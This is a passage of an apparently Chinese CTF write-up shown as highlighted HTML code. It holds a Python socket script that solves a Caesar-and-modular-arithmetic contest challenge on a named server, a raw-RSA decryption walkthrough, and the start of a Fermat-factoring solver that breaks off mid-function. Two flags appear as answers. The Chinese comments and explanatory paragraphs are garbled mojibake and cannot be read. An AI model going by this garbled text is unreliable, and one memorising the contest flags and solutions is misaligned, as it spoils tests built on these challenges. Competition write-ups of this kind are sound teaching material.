</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">P</span> <span class="o">=</span> <span class="mi">1000000007</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">caesar_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å‡¯æ’’è§£å¯†&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">base</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="k">if</span> <span class="n">char</span><span class="o">.</span><span class="n">isupper</span><span class="p">()</span> <span class="k">else</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="n">base</span> <span class="o">-</span> <span class="n">shift</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="n">base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="n">char</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_correct_shift</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;éå†shiftï¼Œè§£å¯†åæå–æ‰€æœ‰æ•°å­—å­—æ®µ&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">shift</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">26</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">plaintext</span> <span class="o">=</span> <span class="n">caesar_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">shift</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[A-Z]:\s*\d+&#39;</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">nums</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;:\s*(\d+)&#39;</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">shift</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="n">nums</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿æ¥é…ç½®</span>
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;geek.ctfplus.cn&#39;</span>  <span class="c1"># è¿œç¨‹æ›¿æ¢ä¸ºæ¯”èµ›æœåŠ¡å™¨IP</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">32729</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">round_num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== ç¬¬</span><span class="si">{</span><span class="n">round_num</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">è½® ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ¥æ”¶å®Œæ•´å¯†æ–‡</span>
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[A-Z]:\s*\d+.*[A-Z]:\s*\d+&#39;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="ow">in</span> <span class="n">buffer</span> <span class="k">else</span> <span class="n">buffer</span>
</span></span><span class="line"><span class="cl">                <span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">):]</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">chunk</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="n">buffer</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">buffer</span>
</span></span><span class="line"><span class="cl">                <span class="n">buffer</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># è§£å¯†ä¸è®¡ç®—xï¼ˆé€»è¾‘ä¸å˜ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="n">shift</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="n">nums</span> <span class="o">=</span> <span class="n">find_correct_shift</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">plaintext</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£å¯†å¤±è´¥ï¼Œç»ˆæ­¢ï¼&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">nums</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">nums</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">inv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">P</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="n">P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span> <span class="o">*</span> <span class="n">inv</span><span class="p">)</span> <span class="o">%</span> <span class="n">P</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># å‘é€x</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># è¯»å–å“åº”</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="ow">in</span> <span class="n">buffer</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">response</span><span class="p">):]</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">chunk</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="n">buffer</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">buffer</span>
</span></span><span class="line"><span class="cl">                <span class="n">buffer</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;æœåŠ¡å™¨å“åº”: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Wrong&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;xé”™è¯¯ï¼Œç»ˆæ­¢ï¼&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ========== ä¿®æ­£ï¼šä¼˜å…ˆè¯»å–ç¼“å†²åŒº + å®Œæ•´æ¥æ”¶Flag ==========</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== æå–Flag ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">buffer</span>  <span class="c1"># å…ˆå–ç¼“å†²åŒºæ®‹ç•™æ•°æ®ï¼ˆFlagå¯èƒ½åœ¨è¿™é‡Œï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å†è¯»å–ç½‘ç»œä¸­å‰©ä½™çš„Flagæ•°æ®</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># è¿‡æ»¤æ‰æ— å…³å†…å®¹ï¼Œæå–Flag</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;SYC\{.*\}&#39;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>  <span class="c1"># æŒ‰é¢˜ç›®Flagæ ¼å¼åŒ¹é…</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æœ€ç»ˆFlag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;åŸå§‹Flagæ•°æ®:&#34;</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>  <span class="c1"># è‹¥æœªåŒ¹é…åˆ°ï¼Œæ‰“å°åŸå§‹å†…å®¹</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;é”™è¯¯: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="31pem">31.pem
</h3><p>æ ¸å¿ƒæ­¥éª¤</p>
<p>æ£€æŸ¥æ–‡ä»¶å¤§å°ï¼š/mnt/data/enc ä¸º 64 å­—èŠ‚ï¼Œè¡¨ç¤ºå•å— RSA å¯†æ–‡ï¼ˆä¸ç§é’¥æ¨¡é•¿åŒ¹é…ï¼‰ã€‚</p>
<p>å°è¯•å¸¸è§„è§£å¯†ï¼šç”¨ cryptography æˆ– openssl å°è¯• OAEPï¼ˆSHA-1/SHA-256ï¼‰å’Œ PKCS#1 v1.5 â€”â€” å…¨éƒ¨å¤±è´¥ï¼ˆpadding check failedï¼‰ã€‚</p>
<p>æ€€ç–‘ raw RSAï¼ˆæ— å¡«å……ï¼‰ï¼šå½“å¡«å……æ ¡éªŒå¤±è´¥ä¸”å¯†æ–‡é•¿åº¦ç­‰äºæ¨¡é•¿æ—¶ï¼Œå¯èƒ½ä½¿ç”¨äº†æœªå¡«å……çš„ RSAï¼ˆæˆ–æŠŠç­¾åå½“å¯†æ–‡ï¼‰ã€‚</p>
<p>æ‰§è¡Œ raw ç§é’¥è¿ç®—ï¼šç”¨ç§é’¥çš„ç§æœ‰æŒ‡æ•° d è®¡ç®— m = c^d mod nï¼Œå¹¶æŠŠç»“æœæŒ‰æ¨¡é•¿è½¬ä¸ºå­—èŠ‚ã€å»æ‰å‰å¯¼é›¶ã€‚</p>
<p>è¯»å–å¹¶ç¡®è®¤æ˜æ–‡ï¼šç»“æœä¸º UTF-8 å¯è¯»å­—ç¬¦ä¸²ï¼Œå³ flagï¼šSYC{PEM_1s_n0t_only_S5l}ã€‚</p>
<p>å¿«é€Ÿå¤ç°ï¼ˆä¸€è¡Œæ¦‚å¿µï¼‰</p>
<p>ç”¨ Python è½½å…¥ç§é’¥ä¸å¯†æ–‡ï¼Œè®¡ç®— m = pow(int.from_bytes(ct,&lsquo;big&rsquo;), d, n)ï¼Œå†è½¬å›å­—èŠ‚å¹¶å»å‰å¯¼é›¶ï¼Œå³ä¸ºæ˜æ–‡ã€‚SYC{PEM_1s_n0t_only_S5l}</p>
<h3 id="32baby_rabin">32.baby_rabin
</h3><p>åˆ†ætaskæ–‡ä»¶å¯å¾—æ˜¯ä¸€ä¸ªRSAåŠ å¯†çš„å˜ç§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fermat_factor</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">search_range</span><span class="o">=</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">24</span><span class="p">):</span>  <span class="c1"># æœç´¢èŒƒå›´çº¦1600ä¸‡</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ä½¿ç”¨è´¹é©¬åˆ†è§£æ³•åˆ†è§£nï¼Œå·²çŸ¥nçš„ä¸¤ä¸ªå› å­æ¯”è¾ƒæ¥è¿‘&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;å¼€å§‹è´¹é©¬åˆ†è§£...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">x</span> <span class="o">*</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    
